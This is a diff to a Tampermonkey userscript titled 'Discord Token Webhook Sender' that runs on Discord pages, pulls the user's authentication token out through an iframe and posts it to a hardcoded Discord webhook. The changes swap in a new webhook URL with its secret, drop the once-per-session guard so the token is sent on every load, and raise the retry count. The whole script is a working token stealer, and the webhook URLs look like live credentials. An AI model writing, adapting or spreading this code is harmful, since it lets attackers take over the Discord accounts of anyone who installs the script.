@@ -1,7 +1,7 @@
 // ==UserScript==
-// @name         Discord Token Sender
+// @name         Discord Token Webhook Sender
 // @namespace    http://tampermonkey.net/
-// @version      1.5
+// @version      1.6
 // @match        https://discord.com/*
 // @match        https://canary.discord.com/*
 // @match        https://ptb.discord.com/*
@@ -14,11 +14,7 @@
 (function() {
     'use strict';
 
-    const v = 'https://canary.discord.com/api/webhooks/1555940056924037203/OPWgPCsiruTsruLWcdOMe7s_p8rlgizS1ebHtu4cxMZxd4NM1sSRH0q_-Q5e0-cYew7K';
-
-    const SENT_KEY = 'sent_' + location.host;
-
-    if (sessionStorage.getItem(SENT_KEY) === 'done') return;
+    const v = 'https://canary.discord.com/api/webhooks/1555948959225217175/b7u6YtKrQkfSlva8y3JFjalPudUyEuQ8I-_q5zyC9BAbeyFCheNjdaB91_2Ohv_6cIzt';
 
     function extractToken() {
         var i = document.createElement('iframe');
@@ -34,7 +30,6 @@
 
     function sendToken(token) {
         token = token.replace(/^"|"$/g, '');
-        sessionStorage.setItem(SENT_KEY, 'done');
 
         GM_xmlhttpRequest({
             method: 'POST',
@@ -58,6 +53,6 @@
     }
 
     window.addEventListener('load', () => {
-        setTimeout(() => tryExtract(10), 1500);
+        setTimeout(() => tryExtract(30), 1500);
     });
 })();
